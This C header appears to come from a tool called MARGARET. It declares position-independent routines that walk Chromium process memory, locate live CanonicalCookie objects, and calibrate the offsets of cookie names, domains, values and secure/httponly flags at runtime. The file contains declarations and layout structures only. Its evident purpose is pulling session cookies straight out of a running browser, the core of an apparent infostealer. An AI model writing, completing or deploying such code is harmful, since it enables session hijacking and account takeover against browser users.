/*
 * cc_layout.h — CanonicalCookie layout calibration contract.
 *
 * Nothing in the Chromium cookie struct is pinned: every field offset
 * is derived at runtime from a sample of live cookies by the
 * calibrator in cc_layout.c (quorum semantics, fail-closed).  Engine A
 * (engine_a.c) consumes the calibrated PIC_CC_LAYOUT during the walk.
 * Shared low-level vets (byte readers, libc++ string reader, pointer
 * and region checks) live here because both modules use them.
 */
#ifndef MARGARET_CC_LAYOUT_H
#define MARGARET_CC_LAYOUT_H

#include "pic_resolve.h"

/* MEMORY_BASIC_INFORMATION (Windows x64) — fields read byte-wise so
 * GCC never merges adjacent dwords into an 8-byte load + movabs mask. */

typedef struct PIC_CC_MBI {
    pic_uptr BaseAddress;       /* +0x00 */
    pic_uptr AllocationBase;    /* +0x08 */
    pic_u32 AllocationProtect;  /* +0x10 */
    pic_u16 PartitionId;        /* +0x14 */
    pic_u16 _padding;           /* +0x16 */
    pic_uptr RegionSize;        /* +0x18 */
    pic_u32 State;              /* +0x20 */
    pic_u32 Protect;            /* +0x24 */
    pic_u32 Type;               /* +0x28 */
} PIC_CC_MBI;

typedef pic_uptr (PIC_MS_ABI *PIC_CC_VQ_FN)(
    const void *address, PIC_CC_MBI *info, pic_size length);

#define MBI_OFF_STATE   0x20u
#define MBI_OFF_PROTECT 0x24u
#define MBI_OFF_BASE    0x00u
#define MBI_OFF_REGION  0x18u

#define MEM_COMMIT 0x1000u
#define PAGE_GUARD 0x100u

/* --- byte readers (little-endian, no 64-bit immediates) --- */

PIC_CODE pic_u32 cc_read_u32(const pic_u8 *data);
PIC_CODE pic_u64 cc_read_u64(const pic_u8 *data);

/* --- libc++ SSO string view + reader (24 bytes on x64) --- */

typedef struct PIC_CC_STRING_VIEW {
    const pic_u8 *data;
    pic_u32 length;
} PIC_CC_STRING_VIEW;

PIC_CODE pic_bool cc_read_string(const pic_u8 *string,
                                 PIC_CC_STRING_VIEW *view);

/* --- pointer / region vets --- */

PIC_CODE pic_bool cc_ptr_plausible(pic_uptr p);
PIC_CODE pic_bool cc_region_ok(const void *p, PIC_CC_MBI *mbi,
                               PIC_CC_VQ_FN vq);

/* --- calibrated CanonicalCookie layout --- */

#define CAL_SAMPLE_MAX    16u   /* stash cap before fail-closed */
#define CAL_SAMPLE_MIN    4u    /* quorum floor */

typedef struct PIC_CC_LAYOUT {
    pic_u32 off_name;
    pic_u32 off_domain;
    pic_u32 off_path;
    pic_u32 off_value;
    pic_u32 off_flag;
    pic_u32 off_creation;
    pic_u32 off_expiry;
    pic_u32 off_same_site;
    pic_u32 off_port;
    pic_u32 calibrated;
} PIC_CC_LAYOUT;

/* Derives every offset from a sample of n live cookies (quorum > n/2).
 * *diag receives the failing step (1..10) for live diagnosis.
 * Fail-closed: PIC_FALSE means "no layout explains this sample". */
PIC_CODE pic_bool margaret_cc_calibrate(
    const pic_u8 *const *sample, pic_u32 n, PIC_CC_VQ_FN vq,
    PIC_CC_LAYOUT *lay, pic_u32 *diag);

/* --- secure_/httponly_ calibration (RFC 6265bis prefixes) --- */

#define FLAGS_ALL_CAND 0xFFFFFFFFu

typedef struct PIC_FLAGS_CAL {
    pic_u32 candidates;  /* bitmask of surviving candidates */
    pic_u32 window_base; /* cookie-relative base of the window */
    pic_u8  calibrated;  /* 0 = in progress, 1 = done, 2 = failed */
    pic_u8  secure_off;  /* calibrated offset of secure_ */
} PIC_FLAGS_CAL;

PIC_CODE void margaret_cc_flags_update(
    PIC_FLAGS_CAL *cal, const pic_u8 *cookie, const pic_u8 *name,
    pic_u32 name_len);
PIC_CODE pic_u32 margaret_cc_flags_read(
    const PIC_FLAGS_CAL *cal, const pic_u8 *cookie);

#endif /* MARGARET_CC_LAYOUT_H */
